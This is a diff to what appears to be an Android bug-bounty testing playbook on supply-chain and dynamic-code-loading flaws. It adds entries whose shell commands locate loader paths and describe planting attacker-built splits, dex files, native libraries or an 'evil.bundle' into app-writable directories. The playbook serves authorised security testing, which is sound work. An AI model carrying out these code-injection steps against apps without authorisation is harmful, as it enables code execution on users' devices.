+- **Test:** Cross-reference: D19-045 owns the Dart/pub Zip Slip and malicious-package test — cite it here. Two distinct issues: a malicious or compromised pub package, and the Zip Slip in the toolchain
   itself. Pub packages can also ship `build_runner` code generators that execute at consumer build time and
   `dart:ffi` native library loads.
 - **How:**
@@ -2758,6 +2934,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | whichever node the introduced behaviour lands in |
 | **Attacker** | AM-08 malicious or compromised third-party code (vendored copy) — rated per the behaviour it introduces |
 | **Applies to** | all, especially apps whose manifest surface is otherwise well-built |
+| **Requires** | — |
 | **Maps to** | the corpus's vendored-patch technique (see also the D10 vendored-WebView-client item); MASWE-0048 |
 
 - **Test:** Compare the bundled library's behaviour against upstream at the same version. A shaded, forked
@@ -2768,7 +2945,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   # get the upstream artifact at the declared version, then diff the classes that matter
   mkdir up && cd up && curl -sO "https://repo1.maven.org/maven2/<g/path>/<artifact>/<ver>/<artifact>-<ver>.aar"
   unzip -o "<artifact>-<ver>.aar" classes.jar && jadx -d up_src classes.jar
-  cd .. && diff -ru up/up_src/sources/<pkg>/ out/sources/<pkg>/ | head -200
+  cd .. && diff -ru up/up_src/sources/<pkg>/ $DEC/jadx/sources/<pkg>/ | head -200
   # and look for shading, which hides the provenance entirely
   grep -rn 'shadow\|relocate\|minimizeJar' --include='*.gradle*' .
   ```
@@ -2783,9 +2960,10 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | | |
 |---|---|
 | **Severity ceiling** | **Critical** if confirmed — and it is an incident, not a bug |
-| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) / `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) depending on what the implanted code does |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) / `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) depending on what the implanted code does |
 | **Attacker** | AM-08 / AM-01 (compromised build) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASWE-0048 (Malicious Code Included in the App, CWE-506/507/511 — modes: malicious developer, compromised dependencies including typosquatting and hijacked packages, compromised build pipeline, hidden functionality); MASWE-0044; MASWE-0075 (Non-Reproducible Builds); MASTG-TECH-0165; MASTG-TOOL-0009; ATT&CK T1474 (detection framing: apps exhibiting "behavioral changes inconsistent with their historical role post-install or update"); T1474.003; T1661 Application Versioning (S1055 SharkBot: "initially poses as a benign application, then malware is downloaded and executed after an application update") |
 
 - **Test:** Analyse the release build for code, permissions or endpoints nobody intended — the supply-chain
@@ -2817,6 +2995,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | per the bug |
 | **Attacker** | n/a (reporting step) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | Google Mobile VRP: "If you have identified a vulnerability in an SDK or library used by a first-party Google app (but not developed by Google), please submit it directly to the maintainer … **If multiple reports of the same SDK or library vulnerability are received, even across different apps, they will be considered duplicates of the earliest report submission due to having the same root cause.**" Samsung: third-party code affecting non-Samsung devices is not eligible. Xiaomi: third-party components only when unknown/0-day, first valid submission only. HackerOne Platform Standards require novel third-party bugs to be reported to the component owner before being reported elsewhere |
 
 - **Test:** Determine whether the flaw is in the app's own code or in a third-party SDK **before** filing.
@@ -2824,9 +3003,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   `io.branch.*`, `com.facebook.*`, `com.google.android.play.*`).
 - **How:**
   ```bash
-  grep -rn '<VulnerableClass>' out/sources/ | head
+  grep -rn '<VulnerableClass>' $DEC/jadx/sources/ | head
   # whose namespace is it?
-  echo "out/sources/com/vendor/..." | awk -F/ '{print $3"."$4"."$5}'
+  echo "$DEC/jadx/sources/com/vendor/..." | awk -F/ '{print $3"."$4"."$5}'
   ```
 - **Proof:** The fully-qualified class name in the report, plus a sentence stating whether the root cause is
   first-party or third-party.
@@ -2844,6 +3023,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a |
 | **Attacker** | n/a (reporting step) |
 | **Applies to** | every Critical/High claim in this domain |
+| **Requires** | — |
 | **Maps to** | the pre-severity gate: five questions asked against the draft Critical *title*, not against the primitive |
 
 - **Test:** This domain produces more overclaimed Criticals than any other, because a write primitive and an
@@ -2878,6 +3058,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a |
 | **Attacker** | n/a (reporting step) |
 | **Applies to** | every chain in this domain, which is most of it |
+| **Requires** | — |
 | **Maps to** | the chain-filing rule: one fix equals one bounty; a chain is a **severity amplifier**, not a merge request |
 
 - **Test:** This chapter's findings are almost always chains: a write primitive owned by D07/D08 plus a
@@ -2911,6 +3092,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | every OTA-substitution, bundle-replacement and dependency-sweep claim in this chapter |
+| **Requires** | — |
 | **Maps to** | Marker Discipline; the Body-Diff Rule; the Shell-Loop Ban |
 
 - **Test:** Three specific ways this domain's evidence goes wrong, and the mechanical guard for each.
@@ -2928,8 +3110,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
     did not run your code — it probably fell back to the packaged bundle. Diff the rendered state, and diff
     the on-device bundle's hash before and after.
     ```bash
-    diff <(adb exec-out run-as com.target.app cat files/CodePush/<h>/<a>/index.android.bundle | sha256sum) \
-         <(sha256sum evil.bundle)
+    diff <(adb exec-out run-as com.target.app cat files/CodePush/<h>/<a>/index.android.bundle | shasum -a 256) \
+         <(shasum -a 256 evil.bundle)
     ```
   - **Shell-Loop Ban.** The MavenGate whois sweep, the abandoned-library sweep and the `.so` version sweep
     all iterate long lists. Shell array loops fail **silently** — a loop can produce zero iterations with no
@@ -2939,6 +3121,182 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   count, all in the evidence bundle.
 - **Escalation:** n/a.
 - **Ruled out when:** n/a — this is the standard, not a test.
+
+### D17-081 · Feature-delivery testing stub shipped in release — `local_testing/` as a code-load directory
+
+| | |
+|---|---|
+| **Severity ceiling** | **Critical** |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1); baseline `client_side_injection.binary_planting.privilege_escalation` (P3) |
+| **Attacker** | AM-03 (a zero-permission app writing the victim's external files directory) / AM-04 with `MANAGE_EXTERNAL_STORAGE` |
+| **Applies to** | apps bundling the Play Feature Delivery library (`com.google.android.play:feature-delivery*`) |
+| **Requires** | device |
+| **Maps to** | MASWE-0049; Android doc *Test Play Feature Delivery locally* (`FakeSplitInstallManagerFactory`, `local_testing`); `risks/dynamic-code-loading` |
+| **Record** | logs/D17-081.txt; screenshots/D17-081-1.png |
+
+- **Skip when:** `grep -rlE 'FakeSplitInstallManager|local_testing' "$DEC/jadx/sources" | grep -v '/android/' | wc -l` is 0 → notes `n/a: no feature-delivery testing stub in the release DEX`.
+- **Test:** The testing artefact replaces the Play-verified installer with one that reads splits from
+  `getExternalFilesDir("local_testing")`. If it is on the release classpath (the `testing` artefact declared in
+  `implementation` instead of `debugImplementation` — one line), anyone who can write that directory supplies
+  module code, and the Play-signed module channel has become an external-storage code load.
+- **How:**
+  ```bash
+  grep -rnE 'FakeSplitInstallManagerFactory|local_testing' "$DEC/jadx/sources" | grep -v '/android/'
+  adb shell ls -la /sdcard/Android/data/com.target.app/files/local_testing/ 2>/dev/null
+  # drop a split you built (any signer) into that directory from the attacker position (D17-011), then trigger the
+  # feature that requests the module; the stub installs whatever it finds, with no Play signature check
+  ```
+- **Proof:** Your split's static initialiser marker in `logcat --pid=<victim>` after a module request, plus
+  `Java.enumerateClassLoaders()` (D17-003) naming the `local_testing` path.
+- **Escalation:** → D17-012 landing; → D17-011 for the attacker model of the external-storage write.
+- **Ruled out when:** The testing factory is absent from the release DEX, or present but unreachable — quote the
+  only call site and show it is dead or `BuildConfig.DEBUG`-gated with `DEBUG=false` in the shipped `BuildConfig`.
+
+### D17-082 · `.so` extraction helpers (SoLoader / ReLinker / custom copy) as a writable native load path
+
+| | |
+|---|---|
+| **Severity ceiling** | **Critical** |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
+| **Attacker** | AM-03 via a D07 / D08 / D17-056 write primitive |
+| **Applies to** | apps with `lib/*.so`, whatever `extractNativeLibs` says |
+| **Requires** | native, device |
+| **Maps to** | MASWE-0049; MASTG-TECH-0029; MASTG-TECH-0041 |
+| **Record** | logs/D17-082.txt |
+
+- **Skip when:** `grep -rlE 'com/facebook/soloader|com/getkeepsafe/relinker|SoLoader\.|ReLinker\.' "$DEC/jadx/sources" | wc -l` is 0 **and** the only `System.load(` argument is `nativeLibraryDir` → notes `n/a: no extraction helper; libraries map from the APK`.
+- **Test:** These helpers exist to work around `extractNativeLibs="false"`: they copy libraries into `lib-main/`,
+  `lib-0/` or `files/lib/` (ReLinker) and load from the copy. The copy is app-writable, so it is a landing site
+  for every write primitive, and the helpers mark nothing read-only — the `extractNativeLibs` negative of
+  D17-013 does not cover them.
+- **How:**
+  ```bash
+  grep -rnE 'SoLoader\.init|SoLoader\.loadLibrary|ReLinker\.(force\(\)\.)?loadLibrary|new File\([^)]*"lib' "$DEC/jadx/sources" | grep -v '/android/'
+  adb -s "$SERIAL" shell "su 0 sh -c 'ls -laR /data/data/com.target.app/lib-main /data/data/com.target.app/lib-0 /data/data/com.target.app/files/lib 2>/dev/null'"
+  # then run D17-002's loader trace and keep every path under the app's data directory
+  ```
+- **Proof:** A `System.load` / `do_dlopen` log line naming a path under the app's data directory, `ls -l` showing
+  it writable, the D17-009 join to a write primitive — then your constructor marker under the victim's PID
+  (the D17-013 payload).
+- **Escalation:** → D17-009 (the join); → D17-016 (no `execute` permission needed: the linker maps it).
+- **Ruled out when:** No helper is present and every `System.load` path is `nativeLibraryDir`; or the helper's
+  copy directory is unreachable by every write primitive you enumerated — one line per primitive.
+
+### D17-083 · IPC-supplied path or file descriptor reaching a loader argument
+
+| | |
+|---|---|
+| **Severity ceiling** | **Critical** |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
+| **Attacker** | AM-02 / AM-03 |
+| **Applies to** | all; needs at least one exported component, deep link or bridge that feeds a string into a loader |
+| **Requires** | device |
+| **Maps to** | MASWE-0049; `risks/dynamic-code-loading`; `risks/unsafe-deserialization` |
+| **Record** | logs/D17-083.txt |
+
+- **Skip when:** `grep -rlE 'DexClassLoader|PathClassLoader|System\.load\(|Runtime\.getRuntime\(\)\.load' "$DEC/jadx/sources" | grep -v '/android/' | wc -l` is 0 → notes `n/a: no loader call site`.
+- **Test:** Trace every loader's path argument backwards. If any segment comes from `getStringExtra`,
+  `getQueryParameter`, a provider `Uri`, a `ParcelFileDescriptor` extra or a bridge message, the attacker chooses
+  the file — no write primitive needed, because the attacker's own `files/` can be made world-readable for the
+  victim to open. D17-042 covers server-controlled values and D17-023 `ApplicationInfo` paths; this is the IPC
+  source.
+- **How:**
+  ```bash
+  grep -rnE 'new (DexClassLoader|PathClassLoader)\(|System\.load\(' -B25 "$DEC/jadx/sources" | grep -nE 'getStringExtra|getQueryParameter|getData\(\)|ParcelFileDescriptor|getParcelableExtra|@JavascriptInterface'
+  # drive it from the probe app: an exported component extra naming /data/data/<probe-package>/files/plugin.dex (file 0644, dir 0755) or a content:// FD
+  ```
+- **Proof:** Your marker under the victim's PID after one Intent or deep link, with the loader log line
+  (D17-002) showing the path you supplied.
+- **Escalation:** Terminal; one-click when the entry is a deep link (→ D09).
+- **Ruled out when:** Every loader path is a compile-time constant under the app's own directory, or a sanitiser
+  canonicalises and prefix-checks it before the load — quote the check and its failure branch.
+
+### D17-084 · Bridged WebView serving from app-writable storage (`InternalStoragePathHandler`, `file:///data/...`)
+
+| | |
+|---|---|
+| **Severity ceiling** | **Critical** |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) via the bridge; without a bridge rate on the demonstrated sink (D10) |
+| **Attacker** | AM-03 via a write primitive / AM-09 via the download that populates the directory |
+| **Applies to** | apps with a WebView; the generic form of D17-033 outside Cordova/Capacitor |
+| **Requires** | webview, device |
+| **Maps to** | MASWE-0049; `androidx.webkit.WebViewAssetLoader.InternalStoragePathHandler` reference; `risks/dynamic-code-loading` |
+| **Record** | logs/D17-084.txt; inventory/webviews.csv row |
+
+- **Skip when:** `grep -rlE 'InternalStoragePathHandler|loadUrl\("file:///data|getFilesDir\(\)[^;]*\.html' "$DEC/jadx/sources" | wc -l` is 0 → notes `n/a: no WebView serves from app storage`.
+- **Test:** `InternalStoragePathHandler` maps a URL prefix onto a directory under the app's data dir. If that
+  directory is populated by a download or is reachable by a traversal, the attacker's HTML runs on the trusted
+  `appassets.androidplatform.net` origin with the bridge attached — script execution with every
+  `@JavascriptInterface` method, in a plain-Java app the framework greps of D17-033/034 never see.
+- **How:**
+  ```bash
+  grep -rnE 'InternalStoragePathHandler\(|addPathHandler\(' -A3 "$DEC/jadx/sources"
+  grep -rnE 'addJavascriptInterface|addWebMessageListener' "$DEC/jadx/sources" | grep -v '/android/'   # is the bridge on that WebView? (D10)
+  adb -s "$SERIAL" shell "su 0 sh -c 'ls -laR /data/data/com.target.app/files/<served-dir>'"
+  ```
+- **Proof:** Your `index.html` rendering with the app's own base origin and a bridge call from it returning real
+  data (D10 enumeration), after a write through the D17-009 join — not through `run-as` or `su`.
+- **Escalation:** → D10 for the bridge reach; → D17-056 if a zip lands the file.
+- **Ruled out when:** The served directory is populated only from the signed APK at install, or no write
+  primitive reaches it (one line per primitive), or the WebView carries no bridge and the origin is isolated.
+
+### D17-085 · Embedded script engine fed from the network or IPC — rate it as a code channel
+
+| | |
+|---|---|
+| **Severity ceiling** | **Critical** |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
+| **Attacker** | AM-09 / AM-06 / AM-03 |
+| **Applies to** | all; Rhino, J2V8 / QuickJS, LuaJ, Chaquopy (Python), Duktape and similar interpreters |
+| **Requires** | device, frida |
+| **Maps to** | MASWE-0049; MASWE-0011 |
+| **Record** | logs/D17-085.txt |
+
+- **Skip when:** the D17-001 interpreter grep is empty → notes `n/a: no embedded script engine`.
+- **Test:** Treat the interpreter's `eval` / `load` entry exactly like `DexClassLoader`: where does the script
+  text come from, and what signature check stands between the source and the call? Apps that run downloaded
+  business rules through an interpreter pass D17-001/002 as "no dynamic loading" while executing server-supplied
+  code on every launch.
+- **How:** Hook the engine's evaluate entry (`Context.evaluateString`, `V8.executeScript`, `Globals.load`,
+  `Python.getInstance().getModule(...)`) with the D17-004 stack-trace hook; read backwards to the source; apply
+  D17-031/032 to the download and D17-056 to any archive.
+- **Proof:** A script you substituted via the attacker-model path (marker-disciplined per D17-080) producing a
+  side effect under the victim's UID.
+- **Escalation:** Every host function the engine binds (file, network, bridge) is the post-exploitation surface
+  — enumerate it.
+- **Ruled out when:** Every script evaluated comes from the signed APK's assets with no network or IPC input in
+  the producing chain, or the download is signature-verified against a compiled-in key with a demonstrated
+  refusal.
+
+### D17-086 · Auto-initialised library code — reachability with no first-party call site
+
+| | |
+|---|---|
+| **Severity ceiling** | Support (the reachability half of D17-060 for init-time code) |
+| **VRT** | n/a |
+| **Attacker** | n/a (tester step) |
+| **Applies to** | all |
+| **Requires** | — |
+| **Maps to** | MASTG-TECH-0129; MASWE-0044; Android doc `androidx.startup` (`InitializationProvider`, `<meta-data android:value="androidx.startup">`) |
+| **Record** | logs/D17-086.txt |
+
+- **Test:** Code registered with App Startup or declared as a library `ContentProvider` runs at process start
+  whether or not the app calls it; a vulnerable or hijacked library in that set is reachable by definition. This
+  is the supply-chain-to-runtime path the Cross-surface joins describe, and the reason "no caller chain" is not a
+  negative for D17-060.
+- **How:**
+  ```bash
+  grep -n -B2 -A4 'androidx.startup.InitializationProvider' "$DEC/apktool/AndroidManifest.xml" | grep -oE 'android:name="[^"]+"'
+  grep -nE '<provider ' "$DEC/apktool/AndroidManifest.xml" | grep -vE 'exported="true"' | grep -oE 'android:name="[^"]+"'   # library init providers
+  # intersect with the SBOM (D17-059) and with every CVE hit from D17-060
+  ```
+- **Proof:** The list of initialisers with the library each belongs to; for a CVE hit, the initialiser's
+  `create()` / `onCreate()` shown reaching the vulnerable method (jadx Find Usage) — this replaces the "exported
+  entry point" leg of D17-060 for init-time code.
+- **Escalation:** → D17-060 (file the sink's effect); → D17-063 (a hijacked `groupId` in this set runs on every
+  cold start).
+- **Ruled out when:** No initialiser or init provider belongs to a library with an advisory, or the initialiser's
+  code path never reaches the vulnerable method — one line per initialiser.
 
 ## Graveyard for this domain
 
